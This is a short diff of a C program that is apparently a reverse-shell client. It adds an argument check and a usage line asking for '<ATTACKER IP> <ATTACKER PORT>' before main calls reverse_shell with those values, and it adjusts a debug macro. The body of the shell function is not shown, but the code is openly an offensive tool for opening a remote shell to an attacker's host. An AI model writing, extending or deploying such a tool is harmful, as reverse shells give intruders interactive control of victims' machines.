@@ -21,7 +21,7 @@
 
 #else
 
-#define PRINT_DEBUG
+#define PRINT_DEBUG(msg) printf(" ")
 
 
 #endif
@@ -153,9 +153,22 @@ reverse_failed:
 }
 
 
+int print_usage(char **argv)
+{
+	return printf("\tUsage  :  %s <ATTACKER IP> <ATTACKER PORT>\n",argv[0]);
+}
+
 int main(int argc,char **argv)
 {
-	reverse_shell(argv[1],argv[2]);	
+	if (argc < 3)
+	{
+		print_usage(argv);
+		return_defer(main_failed);
+	}
 
+	reverse_shell(argv[1],argv[2]);	
 	return 0;
+
+main_failed:
+	return -1;
 }
